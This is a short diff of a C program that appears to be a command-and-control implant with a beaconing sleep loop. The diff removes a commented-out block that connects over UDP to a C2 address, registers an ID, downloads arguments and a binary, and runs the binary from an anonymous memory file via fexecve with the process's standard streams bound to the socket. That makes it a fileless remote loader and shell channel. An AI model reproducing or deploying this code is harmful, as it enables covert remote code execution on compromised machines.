@@ -51,64 +51,10 @@ int main() {
 
                 printf("Spawning session handler to %s:%d\n", c2_ip, ntohl(*((int*)(buffer + 4))));
 
-                /*sock_fd = socket(AF_INET, SOCK_DGRAM, 0);
-                socklen_t servaddr_len = sizeof(servaddr);
-                servaddr.sin_family = AF_INET;
-                servaddr.sin_port = ntohl(*((int*)(buffer + 4)));
-                servaddr.sin_addr.s_addr = inet_addr(c2_ip);
-                connect(sock_fd, (struct sockaddr *) &servaddr, sizeof(servaddr));
-
-                // Check in with ID
-                a = ID;
-                sendto(sock_fd, &a, 4, 0, (struct sockaddr *)&servaddr, sizeof(servaddr));
-
-                // Receive initial packet
-                int header[2];
-                recvfrom(sock_fd, header, 8, 0, (struct sockaddr *)&servaddr, &servaddr_len);
-
-                // Allocate buffers
-                char *args = malloc(header[0]);
-                char *bin = malloc(header[1]);
-
-                // Receive args
-                recvfrom(sock_fd, args, header[0], 0, (struct sockaddr *)&servaddr, &servaddr_len);
-
-                // Receive binary
-                a = header[1];
-                while (a > 1024) {
-                    recvfrom(sock_fd, bin, 1024, 0, (struct sockaddr *)&servaddr, &servaddr_len);
-                    a -= 1024;
-                    bin += 1024;
-                }
-                recvfrom(sock_fd, bin, a, 0, (struct sockaddr *)&servaddr, &servaddr_len);
-                bin -= (header[1] - a);
-
-                // Execute binary
-                a = memfd_create("0", 0);
-                write(a, bin, header[1]);
-
-                char** argv = malloc(sizeof(char*));
-                int b = 0;
-                char *p = strtok(args, " ");
-                while (p != NULL) {
-                    argv[b] = malloc(strlen(p) + 1);
-                    strcpy(argv[b], p);
-                    argv = realloc(argv, sizeof(char*) * (++b));
-                    p = strtok (NULL, " ");
-                }
-
-                if (fork()) {
-                    dup2(sock_fd, 0);
-                    dup2(sock_fd, 1);
-                    dup2(sock_fd, 2);
-                    fexecve(a, argv, argv);
-                    perror("fexecve");
-                }*/
-
                 exit(0);
 
             }
-            continue;
+            //continue;
         }
 
         sleep((2 << (unsigned char)buffer[2]));
